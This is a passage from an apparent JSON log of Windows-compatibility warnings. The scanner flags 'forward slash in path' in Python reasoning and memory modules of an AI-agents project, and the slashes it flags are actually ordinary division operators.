        "warning": "Line 1581: Forward slash in path - '}\n            \n            # Simple regression: effect_t = α + β₁*effect_{t-1} + β₂*cause_{t-lag} + ε\n            y = np.array([row[0] for row in aligned_data])  # Current effect\n            X_ar = np.array([row[1] for row in aligned_data])  # Previous effect (autoregressive)\n            X_cause = np.array([row[2] for row in aligned_data])  # Lagged cause\n            \n            # Fit restricted model (without cause)\n            ar_slope, ar_intercept, ar_r, ar_p, ar_se = stats.linregress(X_ar, y)\n            ar_predictions = ar_slope * X_ar + ar_intercept\n            sse_restricted = np.sum((y - ar_predictions)**2)\n            \n            # Fit unrestricted model (with cause) - simplified multiple regression\n            # Use correlation as approximation\n            cause_correlation, cause_p = stats.pearsonr(X_cause, y)\n            \n            # Calculate F-statistic approximation\n            n = len(aligned_data)\n            if n > 3 and ar_r != 1.0:\n                f_stat_approx = abs(cause_correlation)**2 / (1 - abs(cause_correlation)**2) * (n - 2)\n                \n                # Convert to p-value approximation\n                p_value_approx = 2 * (1 - stats.norm.cdf(abs(cause_correlation) * np.sqrt(n - 2)))\n                \n                granger_result = {\n                    '",
        "timestamp": "2025-09-05T17:30:42.297408"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 1708: Forward slash in path - \"Cyclical pattern with {pattern.periodicity.total_seconds()/3600:.1f}h period\"",
        "timestamp": "2025-09-05T17:30:42.297530"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 1758: Forward slash in path - \"\n        \n        risk_factors = []\n        \n        # High volatility risk\n        high_volatility_vars = []\n        for var, analysis in analysis_results.items():\n            cv = analysis.std / max(abs(analysis.mean), 1e-10)  # Coefficient of variation\n            if cv > 1.0:  # High volatility\n                high_volatility_vars.append(var)\n        \n        if high_volatility_vars:\n            risk_factors.append({\n                '",
        "timestamp": "2025-09-05T17:30:42.297625"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 1821: Forward slash in path - \"\n        \n        if not analysis_results:\n            return 0.0\n        \n        coherence_factors = []\n        \n        # Pattern consistency across variables\n        all_pattern_strengths = []\n        for analysis in analysis_results.values():\n            pattern_strengths = [p.strength for p in analysis.detected_patterns]\n            if pattern_strengths:\n                all_pattern_strengths.append(np.mean(pattern_strengths))\n        \n        if all_pattern_strengths:\n            pattern_coherence = np.mean(all_pattern_strengths)\n            coherence_factors.append(pattern_coherence)\n        \n        # Predictability consistency\n        predictability_scores = [analysis.predictability_score for analysis in analysis_results.values()]\n        if predictability_scores:\n            pred_coherence = 1.0 - np.std(predictability_scores)  # Lower std = higher coherence\n            coherence_factors.append(max(0.0, pred_coherence))\n        \n        # Temporal alignment (synchronized patterns)\n        # Simplified: count variables with similar pattern timing\n        pattern_times = defaultdict(list)\n        for analysis in analysis_results.values():\n            for pattern in analysis.detected_patterns:\n                pattern_times[pattern.pattern_type].append(pattern.start_time)\n        \n        synchronized_patterns = 0\n        total_pattern_types = 0\n        \n        for pattern_type, times in pattern_times.items():\n            if len(times) > 1:\n                total_pattern_types += 1\n                time_spread = max(times) - min(times)\n                if time_spread < timedelta(hours=6):  # Patterns within 6 hours\n                    synchronized_patterns += 1\n        \n        if total_pattern_types > 0:\n            sync_coherence = synchronized_patterns / total_pattern_types\n            coherence_factors.append(sync_coherence)\n        \n        # Combined coherence\n        return np.mean(coherence_factors) if coherence_factors else 0.5\n    \n    async def get_performance_metrics(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.297729"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 1887: Forward slash in path - ': len(self.time_series_analyzer.analysis_cache) / max(1, len(self.variable_data))\n        }\n    \n    def set_causal_engine(self, causal_engine) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.297813"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 101: Forward slash in path - \"\n        if self.token_count == 0:\n            self.token_count = max(1, len(self.content) // 4)  # Rough token estimate\n    \n    def calculate_composite_score(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.298373"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 238: Forward slash in path - \"\n        if not problem:\n            return 0.5\n        \n        # Simple keyword overlap (would use embeddings in practice)\n        problem_words = set(problem.lower().split())\n        content_words = set(content.lower().split())\n        \n        if not problem_words:\n            return 0.5\n        \n        overlap = len(problem_words & content_words)\n        relevance = min(1.0, overlap / len(problem_words) * 2)  # Scale appropriately\n        \n        return relevance\n    \n    async def _assess_logical_consistency(self, content: str) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.298455"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 284: Forward slash in path - ']\n        \n        content_lower = content.lower()\n        \n        specific_count = sum(1 for indicator in specific_indicators if indicator in content_lower)\n        vague_count = sum(1 for indicator in vague_indicators if indicator in content_lower)\n        \n        # Length as proxy for detail\n        length_factor = min(1.0, len(content) / 200.0)\n        \n        specificity = (specific_count * 0.2 + length_factor * 0.5 - vague_count * 0.1)\n        \n        return max(0.1, min(1.0, specificity))\n    \n    async def _evaluate_causal_coherence(self, thought: Thought, parent_thought: Optional[Thought]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.298490"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 326: Forward slash in path - '\n        ]\n        \n        child_lower = child_content.lower()\n        \n        # Check for explicit causal connectors\n        connector_count = sum(1 for connector in causal_connectors if connector in child_lower)\n        \n        if connector_count > 0:\n            return min(1.0, connector_count * 0.5 + 0.3)\n        \n        # Check for implicit causal flow (content building on previous)\n        parent_words = set(parent_content.lower().split())\n        child_words = set(child_content.lower().split())\n        \n        overlap = len(parent_words & child_words)\n        if overlap > 0:\n            return min(0.8, overlap / len(parent_words) + 0.3)\n        \n        return 0.3  # Minimal flow\n    \n    async def _assess_assumption_consistency(self, parent_assumptions: List[str], \n                                          child_assumptions: List[str]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.298524"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 364: Forward slash in path - ')\n        ]\n        \n        contradictions = 0\n        for parent_assumption in parent_set:\n            for child_assumption in child_set:\n                for neg, pos in contradiction_pairs:\n                    if (neg in parent_assumption and pos in child_assumption) or \\\n                       (pos in parent_assumption and neg in child_assumption):\n                        contradictions += 1\n        \n        # Calculate consistency\n        total_comparisons = len(parent_set) * len(child_set)\n        if total_comparisons == 0:\n            return 1.0\n        \n        consistency = 1.0 - (contradictions / total_comparisons)\n        return max(0.0, consistency)\n    \n    async def _assess_prediction_alignment(self, parent_predictions: Dict[str, float],\n                                         child_predictions: Dict[str, float]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.298553"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 385: Forward slash in path - \"\n        \n        if not parent_predictions or not child_predictions:\n            return 0.7  # Neutral when predictions missing\n        \n        # Find common prediction variables\n        common_vars = set(parent_predictions.keys()) & set(child_predictions.keys())\n        \n        if not common_vars:\n            return 0.5  # No overlap\n        \n        # Calculate alignment for common variables\n        alignment_scores = []\n        \n        for var in common_vars:\n            parent_pred = parent_predictions[var]\n            child_pred = child_predictions[var]\n            \n            # Calculate similarity (1 - normalized difference)\n            max_val = max(abs(parent_pred), abs(child_pred), 1.0)\n            difference = abs(parent_pred - child_pred) / max_val\n            alignment = 1.0 - difference\n            \n            alignment_scores.append(alignment)\n        \n        return np.mean(alignment_scores) if alignment_scores else 0.5\n    \n    async def _evaluate_predictive_power(self, thought: Thought, context: Dict[str, Any]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.298575"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 983: Forward slash in path - \"\n        \n        if not memories:\n            return 0.5\n        \n        try:\n            # Simple coherence based on content overlap\n            thought_words = set(thought.content.lower().split())\n            \n            coherence_scores = []\n            for memory in memories:\n                memory_words = set(memory.content.lower().split())\n                if thought_words and memory_words:\n                    overlap = len(thought_words & memory_words)\n                    union = len(thought_words | memory_words)\n                    coherence = overlap / union if union > 0 else 0.0\n                    coherence_scores.append(coherence)\n            \n            return np.mean(coherence_scores) if coherence_scores else 0.5\n            \n        except Exception as e:\n            logger.debug(f\"",
        "timestamp": "2025-09-05T17:30:42.298928"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 1359: Forward slash in path - \"\n        \n        # Word overlap\n        child_words = set(child_content.lower().split())\n        parent_words = set(parent_content.lower().split())\n        \n        if not parent_words:\n            return 0.5\n        \n        overlap = len(child_words & parent_words)\n        coherence = min(1.0, overlap / len(parent_words) * 2)\n        \n        # Boost for logical connectors\n        logical_connectors = ['",
        "timestamp": "2025-09-05T17:30:42.299183"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 1406: Forward slash in path - ' in c_assumption):\n                        if any(word in p_assumption for word in c_assumption.split()):\n                            contradictions += 1\n            \n            if contradictions > 0:\n                assumption_consistency = max(0.3, 1.0 - contradictions * 0.3)\n        \n        # Check prediction consistency\n        prediction_consistency = 1.0\n        if parent_thought.causal_predictions and child_thought.causal_predictions:\n            common_vars = set(parent_thought.causal_predictions.keys()) & set(child_thought.causal_predictions.keys())\n            \n            if common_vars:\n                consistency_scores = []\n                for var in common_vars:\n                    p_pred = parent_thought.causal_predictions[var]\n                    c_pred = child_thought.causal_predictions[var]\n                    \n                    # Calculate consistency (1 - normalized difference)\n                    max_val = max(abs(p_pred), abs(c_pred), 1.0)\n                    difference = abs(p_pred - c_pred) / max_val\n                    consistency = 1.0 - difference\n                    consistency_scores.append(consistency)\n                \n                prediction_consistency = np.mean(consistency_scores)\n        \n        return (assumption_consistency + prediction_consistency) / 2.0\n    \n    async def _construct_integrated_path(self, solution_thought: Thought, \n                                       context: Dict[str, Any]) -> ReasoningPath:\n        \"",
        "timestamp": "2025-09-05T17:30:42.299252"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 1436: Forward slash in path - \"\n        \n        # Trace path from solution to root\n        path_thoughts = []\n        current_thought = solution_thought\n        \n        while current_thought:\n            path_thoughts.append(current_thought)\n            parent_id = current_thought.parent_id\n            current_thought = self.thought_tree.get(parent_id) if parent_id else None\n        \n        path_thoughts.reverse()  # Root to solution order\n        \n        # Calculate path metrics\n        total_quality = sum(t.quality_score for t in path_thoughts) / len(path_thoughts)\n        confidence = solution_thought.confidence if solution_thought.confidence > 0 else solution_thought.quality_score\n        solution_quality = solution_thought.quality_score\n        \n        # Memory coherence\n        memory_coherence = 0.0\n        if self.memory_integrator:\n            memory_coherence = await self.memory_integrator.calculate_memory_coherence(\n                path_thoughts, self.current_session_id\n            )\n        \n        # Token efficiency\n        total_tokens = sum(t.token_count for t in path_thoughts)\n        token_efficiency = min(1.0, self.token_budget / max(total_tokens, 1))\n        \n        # Causal chain construction\n        causal_chain = await self._construct_causal_chain(path_thoughts)\n        \n        # Generate reasoning trace\n        reasoning_trace = await self._generate_comprehensive_trace(path_thoughts)\n        \n        reasoning_path = ReasoningPath(\n            thoughts=path_thoughts,\n            total_quality=total_quality,\n            confidence=confidence,\n            reasoning_trace=reasoning_trace,\n            solution_quality=solution_quality,\n            causal_chain=causal_chain,\n            memory_coherence=memory_coherence,\n            token_efficiency=token_efficiency\n        )\n        \n        return reasoning_path\n    \n    async def _construct_causal_chain(self, thoughts: List[Thought]) -> List[Dict[str, Any]]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.299308"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\tree_of_thoughts.py",
        "warning": "Line 1564: Forward slash in path - ': reasoning_path.solution_quality / max(1, len(self.thought_tree))\n        })\n        \n        # Update global metrics\n        global_metrics.gauge(\"",
        "timestamp": "2025-09-05T17:30:42.299392"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 111: Forward slash in path - \"\n        # Rough approximation: 4 characters per token on average\n        return max(1, len(self.content) // 4)\n    \n    def calculate_relevance_score(self, query_context: Dict[str, Any] = None, \n                                current_time: Optional[datetime] = None) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.299830"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 117: Forward slash in path - \"\n        if current_time is None:\n            current_time = datetime.now()\n        \n        # Time-based decay\n        time_diff = (current_time - self.last_accessed).total_seconds() / 3600  # hours\n        recency_score = np.exp(-self.decay_rate * time_diff)\n        \n        # Importance weighting\n        importance_score = self.importance.value / 5.0\n        \n        # Access frequency (with diminishing returns)\n        frequency_score = min(1.0, np.log1p(self.access_count) / 5.0)\n        \n        # Coherence contribution\n        coherence_score = self.coherence_score\n        \n        # Context relevance\n        context_score = 0.5\n        if query_context and self.context:\n            context_score = self._calculate_context_similarity(query_context, self.context)\n        \n        # Connection strength (how well connected to other memories)\n        connection_strength = min(1.0, len(self.connections) / 10.0)\n        \n        # Combined relevance with adaptive weighting\n        relevance = (\n            recency_score * 0.15 +\n            importance_score * 0.25 +\n            frequency_score * 0.15 +\n            coherence_score * 0.2 +\n            context_score * 0.15 +\n            connection_strength * 0.1\n        )\n        \n        return min(1.0, relevance)\n    \n    def _calculate_context_similarity(self, context1: Dict[str, Any], context2: Dict[str, Any]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.299854"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 155: Forward slash in path - \"\n        if not context1 or not context2:\n            return 0.0\n        \n        common_keys = set(context1.keys()) & set(context2.keys())\n        if not common_keys:\n            return 0.0\n        \n        matches = 0\n        for key in common_keys:\n            if str(context1[key]).lower() == str(context2[key]).lower():\n                matches += 1\n            elif isinstance(context1[key], (int, float)) and isinstance(context2[key], (int, float)):\n                # Numerical similarity\n                if abs(context1[key] - context2[key]) / max(abs(context1[key]), abs(context2[key]), 1) < 0.1:\n                    matches += 0.8\n        \n        return matches / len(common_keys)\n    \n    def update_access(self):\n        \"",
        "timestamp": "2025-09-05T17:30:42.299868"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 292: Forward slash in path - \"\n        coherence_factors = []\n        \n        # Content similarity\n        content_similarity = await self._content_similarity(memory1.content, memory2.content)\n        coherence_factors.append(content_similarity)\n        \n        # Tag overlap\n        if memory1.tags and memory2.tags:\n            tag_overlap = len(memory1.tags & memory2.tags) / len(memory1.tags | memory2.tags)\n            coherence_factors.append(tag_overlap)\n        \n        # Context consistency\n        context_consistency = memory1._calculate_context_similarity(memory1.context, memory2.context)\n        coherence_factors.append(context_consistency)\n        \n        # Temporal consistency (memories close in time should be more coherent)\n        time_diff = abs((memory1.created_at - memory2.created_at).total_seconds())\n        temporal_factor = np.exp(-time_diff / 3600.0)  # Exponential decay over hours\n        coherence_factors.append(temporal_factor)\n        \n        # Connection strength\n        connection_strength = memory1.connections.get(memory2.id, 0.0)\n        coherence_factors.append(connection_strength)\n        \n        return np.mean(coherence_factors)\n    \n    async def _content_similarity(self, content1: str, content2: str) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.299949"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 320: Forward slash in path - \"\n        # Simple word overlap similarity (would use embeddings in practice)\n        words1 = set(content1.lower().split())\n        words2 = set(content2.lower().split())\n        \n        if not words1 or not words2:\n            return 0.0\n        \n        intersection = len(words1 & words2)\n        union = len(words1 | words2)\n        \n        return intersection / union if union > 0 else 0.0\n    \n    async def _calculate_temporal_coherence(self, memories: List[MemoryNode]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.299966"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 334: Forward slash in path - \"\n        if len(memories) < 2:\n            return 1.0\n        \n        # Sort by creation time\n        sorted_memories = sorted(memories, key=lambda m: m.created_at)\n        \n        temporal_coherence_scores = []\n        \n        for i in range(len(sorted_memories) - 1):\n            curr_memory = sorted_memories[i]\n            next_memory = sorted_memories[i + 1]\n            \n            # Check for logical progression\n            time_gap = (next_memory.created_at - curr_memory.created_at).total_seconds()\n            \n            # Prefer moderate time gaps (not too fast, not too slow)\n            optimal_gap = 60.0  # 1 minute\n            gap_score = np.exp(-abs(time_gap - optimal_gap) / optimal_gap)\n            \n            # Check content progression\n            content_progression = await self._assess_content_progression(curr_memory, next_memory)\n            \n            temporal_coherence_scores.append((gap_score + content_progression) / 2)\n        \n        return np.mean(temporal_coherence_scores) if temporal_coherence_scores else 1.0\n    \n    async def _assess_content_progression(self, memory1: MemoryNode, memory2: MemoryNode) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.299987"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 379: Forward slash in path - \"\n        if len(memories) < 2:\n            return 1.0\n        \n        # Check for semantic consistency\n        semantic_scores = []\n        \n        # Topic consistency\n        all_tags = set()\n        for memory in memories:\n            all_tags.update(memory.tags)\n        \n        topic_scores = []\n        for memory in memories:\n            if memory.tags and all_tags:\n                topic_overlap = len(memory.tags & all_tags) / len(all_tags)\n                topic_scores.append(topic_overlap)\n        \n        if topic_scores:\n            semantic_scores.append(np.mean(topic_scores))\n        \n        # Contradiction detection\n        contradiction_score = await self._detect_contradictions(memories)\n        semantic_scores.append(1.0 - contradiction_score)  # Invert contradiction score\n        \n        return np.mean(semantic_scores) if semantic_scores else 0.5\n    \n    async def _detect_contradictions(self, memories: List[MemoryNode]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.300022"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 410: Forward slash in path - ')\n        ]\n        \n        contradiction_count = 0\n        total_pairs = 0\n        \n        for i, memory1 in enumerate(memories):\n            for memory2 in memories[i+1:]:\n                total_pairs += 1\n                content1_lower = memory1.content.lower()\n                content2_lower = memory2.content.lower()\n                \n                for neg_word, pos_word in contradiction_indicators:\n                    if (neg_word in content1_lower and pos_word in content2_lower) or \\\n                       (pos_word in content1_lower and neg_word in content2_lower):\n                        contradiction_count += 1\n                        break\n        \n        return contradiction_count / max(1, total_pairs)\n    \n    async def _calculate_causal_coherence(self, memories: List[MemoryNode]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.300044"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 843: Forward slash in path - '}\n        \n        session = self.active_sessions[session_id]\n        \n        # Get session memories\n        session_memories = [\n            self._get_memory_by_id(mem_id) for mem_id in session.memory_nodes\n        ]\n        session_memories = [mem for mem in session_memories if mem is not None]\n        \n        # Calculate session metrics\n        coherence_score = await self.coherence_tracker.calculate_coherence(session_memories)\n        \n        # Memory type distribution\n        memory_type_dist = {}\n        for memory in session_memories:\n            mem_type = memory.memory_type.value\n            memory_type_dist[mem_type] = memory_type_dist.get(mem_type, 0) + 1\n        \n        # Reasoning chain analysis\n        chain_length = len(session.reasoning_chain)\n        chain_coherence = coherence_score\n        \n        # Token utilization\n        total_tokens = sum(mem.token_count for mem in session_memories)\n        token_utilization = total_tokens / self.max_total_tokens\n        \n        summary = {\n            '",
        "timestamp": "2025-09-05T17:30:42.300308"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 872: Forward slash in path - ': (datetime.now() - session.started_at).total_seconds() / 60,\n            '",
        "timestamp": "2025-09-05T17:30:42.300336"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 965: Forward slash in path - \"\n        \n        # Age factor (older memories more likely to remove)\n        age_hours = (datetime.now() - memory.created_at).total_seconds() / 3600\n        age_score = min(1.0, age_hours / 24)  # Normalize to 24 hours\n        \n        # Importance factor (less important more likely to remove)\n        importance_score = 1.0 - (memory.importance.value / 5.0)\n        \n        # Access frequency factor (less accessed more likely to remove)\n        access_score = 1.0 - min(1.0, memory.access_count / 10.0)\n        \n        # Coherence factor (less coherent more likely to remove)\n        coherence_score = 1.0 - memory.coherence_score\n        \n        # Combined removal score\n        removal_score = (\n            age_score * 0.3 +\n            importance_score * 0.3 +\n            access_score * 0.2 +\n            coherence_score * 0.2\n        )\n        \n        return removal_score\n    \n    async def _generate_embedding(self, content: str) -> List[float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.300420"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 1028: Forward slash in path - \"\n        \n        # Semantic similarity (would use embeddings in practice)\n        semantic_similarity = await self._semantic_similarity(memory1.content, memory2.content)\n        \n        # Context similarity\n        context_similarity = memory1._calculate_context_similarity(memory1.context, memory2.context)\n        \n        # Tag overlap\n        tag_overlap = 0.0\n        if memory1.tags and memory2.tags:\n            tag_overlap = len(memory1.tags & memory2.tags) / len(memory1.tags | memory2.tags)\n        \n        # Session continuity\n        session_bonus = 0.2 if memory1.reasoning_session == memory2.reasoning_session else 0.0\n        \n        # Temporal proximity\n        time_diff = abs((memory1.created_at - memory2.created_at).total_seconds())\n        temporal_factor = np.exp(-time_diff / 3600.0)  # Decay over hours\n        \n        # Combined relatedness\n        relatedness = (\n            semantic_similarity * 0.4 +\n            context_similarity * 0.2 +\n            tag_overlap * 0.2 +\n            temporal_factor * 0.1 +\n            session_bonus\n        )\n        \n        return min(1.0, relatedness)\n    \n    async def _semantic_similarity(self, content1: str, content2: str) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.300480"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 1060: Forward slash in path - \"\n        # Simple word overlap (would use embeddings in practice)\n        words1 = set(content1.lower().split())\n        words2 = set(content2.lower().split())\n        \n        if not words1 or not words2:\n            return 0.0\n        \n        intersection = len(words1 & words2)\n        union = len(words1 | words2)\n        \n        return intersection / union if union > 0 else 0.0\n    \n    async def _manage_working_memory_capacity(self) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.300511"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 1074: Forward slash in path - \"\n        \n        working_store = self.memory_stores[MemoryType.WORKING]\n        \n        if len(working_store) <= self.working_memory_capacity:\n            return\n        \n        # Calculate token count in working memory\n        working_tokens = sum(mem.token_count for mem in working_store.values())\n        \n        if working_tokens <= self.max_working_memory_tokens:\n            return\n        \n        # Sort memories by relevance/importance\n        memories_by_priority = list(working_store.values())\n        memories_by_priority.sort(\n            key=lambda m: (m.importance.value, m.coherence_score, m.calculate_relevance_score()),\n            reverse=True\n        )\n        \n        # Keep top memories, promote others to short-term\n        keep_count = 0\n        keep_tokens = 0\n        \n        for memory in memories_by_priority:\n            if (keep_count < self.working_memory_capacity and \n                keep_tokens + memory.token_count <= self.max_working_memory_tokens):\n                keep_count += 1\n                keep_tokens += memory.token_count\n            else:\n                # Promote to short-term storage\n                await self._promote_memory(memory, MemoryType.SHORT_TERM)\n                logger.debug(f\"",
        "timestamp": "2025-09-05T17:30:42.300552"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 1207: Forward slash in path - \"\n        \n        # Count memories and tokens\n        total_memories = sum(len(store) for store in self.memory_stores.values())\n        total_tokens = sum(\n            sum(mem.token_count for mem in store.values())\n            for store in self.memory_stores.values()\n        )\n        \n        # Memory efficiency (useful memories / total memories)\n        high_importance_count = sum(\n            sum(1 for mem in store.values() if mem.importance.value >= 4)\n            for store in self.memory_stores.values()\n        )\n        memory_efficiency = high_importance_count / max(1, total_memories)\n        \n        # Update metrics\n        self.performance_metrics.update({\n            '",
        "timestamp": "2025-09-05T17:30:42.300639"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 1227: Forward slash in path - ': total_tokens / self.max_total_tokens,\n            '",
        "timestamp": "2025-09-05T17:30:42.300670"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 1229: Forward slash in path - ': len(self.memory_stores[MemoryType.LONG_TERM]) / max(1, total_memories)\n        })\n        \n        # Update global metrics\n        global_metrics.gauge(\"",
        "timestamp": "2025-09-05T17:30:42.300705"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 1319: Forward slash in path - \"\n        \n        # Access frequency\n        access_factor = min(1.0, memory.access_count / 5.0)\n        \n        # Importance\n        importance_factor = memory.importance.value / 5.0\n        \n        # Connection strength\n        connection_strength = len(memory.connections) / 10.0\n        \n        # Age (older memories more likely to consolidate)\n        age_hours = (datetime.now() - memory.created_at).total_seconds() / 3600\n        age_factor = min(1.0, age_hours / 24.0)\n        \n        # Coherence\n        coherence_factor = memory.coherence_score\n        \n        consolidation_score = (\n            access_factor * 0.25 +\n            importance_factor * 0.3 +\n            connection_strength * 0.15 +\n            age_factor * 0.1 +\n            coherence_factor * 0.2\n        )\n        \n        return consolidation_score\n    \n    async def _consolidate_single_memory(self, memory_id: str) -> bool:\n        \"",
        "timestamp": "2025-09-05T17:30:42.300789"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 1393: Forward slash in path - ']\n                \n                memory1 = self._get_memory_by_id(memory1_id)\n                memory2 = self._get_memory_by_id(memory2_id)\n                \n                if memory1 and memory2:\n                    # Keep memory with higher importance/coherence\n                    if memory1.importance.value < memory2.importance.value:\n                        memory1.tags.add('",
        "timestamp": "2025-09-05T17:30:42.300856"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
        "warning": "Line 1470: Forward slash in path - '] = (initial_tokens - final_tokens) / initial_tokens\n        \n        return consolidation_results\n    \n    async def _consolidate_cluster(self, cluster: List[MemoryNode], session_id: str) -> Optional[MemoryNode]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.300940"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\working_memory.py",
